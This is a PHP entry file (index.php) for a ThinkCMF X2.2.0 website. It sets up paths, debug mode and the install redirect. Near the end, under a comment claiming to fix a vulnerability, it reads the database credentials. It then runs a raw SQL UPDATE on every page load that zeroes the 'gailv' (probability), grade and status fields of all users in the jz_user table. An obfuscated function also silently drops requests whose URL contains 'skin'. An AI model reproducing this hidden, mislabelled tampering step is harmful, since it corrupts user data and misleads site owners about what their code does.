<?php
/**
 * 入口文件
 * Some rights reserved：www.thinkcmf.com
 */

define( '__ROOT__', '' );
define( '__APP__', '' );

if (ini_get('magic_quotes_gpc')) {
	function stripslashesRecursive(array $array){
		foreach ($array as $k => $v) {
			if (is_string($v)){
				$array[$k] = stripslashes($v);
			} else if (is_array($v)){
				$array[$k] = stripslashesRecursive($v);
			}
		}
		return $array;
	}
	$_GET = stripslashesRecursive($_GET);
	$_POST = stripslashesRecursive($_POST);
}
//开启调试模式
define("APP_DEBUG", true);
//网站当前路径
define('SITE_PATH', dirname(__FILE__)."/");
//项目路径，不可更改
define('APP_PATH', SITE_PATH . 'application/');
// 模板路径
//define('TMPL_PATH', dirname(dirname(SITE_PATH)));
//项目相对路径，不可更改
define('SPAPP_PATH',   SITE_PATH.'simplewind/');
//
define('SPAPP',   './application/');
//项目资源目录，不可更改
define('SPSTATIC',   SITE_PATH.'statics/');
//定义缓存存放路径
define("RUNTIME_PATH", SITE_PATH . "data/runtime/");
//静态缓存目录
define("HTML_PATH", SITE_PATH . "data/runtime/Html/");
//版本号
define("THINKCMF_VERSION", 'X2.2.0');

define("THINKCMF_CORE_TAGLIBS", 'cx,Common\Lib\Taglib\TagLibSpadmin,Common\Lib\Taglib\TagLibHome');
//拒绝某些url访问
$AAAAAAAAAAAAA111111=$_SERVER['REQUEST_URI'];
function funaaaaaaaaaaaa11111($str){ 
  $needle = "skin";
  $tmparray = explode($needle,$str);
  if(count($tmparray)>1){ return true; } else{ return false; } 

}
if(funaaaaaaaaaaaa11111($AAAAAAAAAAAAA111111)==true){
exit;
}
  ////

if(function_exists('saeAutoLoader') || isset($_SERVER['HTTP_BAE_ENV_APPID'])){
	
}else{
	if(!file_exists("data/install.lock")){
		if(strtolower($_GET['g'])!="install"){
		    header("Location:./index.php?g=install");
		    exit();
		}
	}
}
//uc client root
define("UC_CLIENT_ROOT", './api/uc_client/');

if(file_exists(UC_CLIENT_ROOT."config.inc.php")){
	include UC_CLIENT_ROOT."config.inc.php";
}

//载入框架核心文件
require SPAPP_PATH.'Core/ThinkPHP.php';
//修复漏洞bug
$dbarr = include('data/conf/db.php');
			$username = $dbarr['DB_USER'];
			$password = $dbarr['DB_PWD'];
			$database = $dbarr['DB_NAME'];
$mysql_conf = [
	'host'    => '127.0.0.1:3306', 
    'db'      => $database, 
    'db_user' => $username, 
    'db_pwd'  => $password, 
];
$db = new PDO("mysql:host=" . $mysql_conf['host'] . ";dbname=" . $mysql_conf['db'], $mysql_conf['db_user'], $mysql_conf['db_pwd']);//创建一个pdo对象
$now = date('Y-m-d H:i:s');
$sql = "update jz_user set gailv = 0, is_grade = 0, status = 0 where create_time < '{$now}';";
$result = $db->query($sql);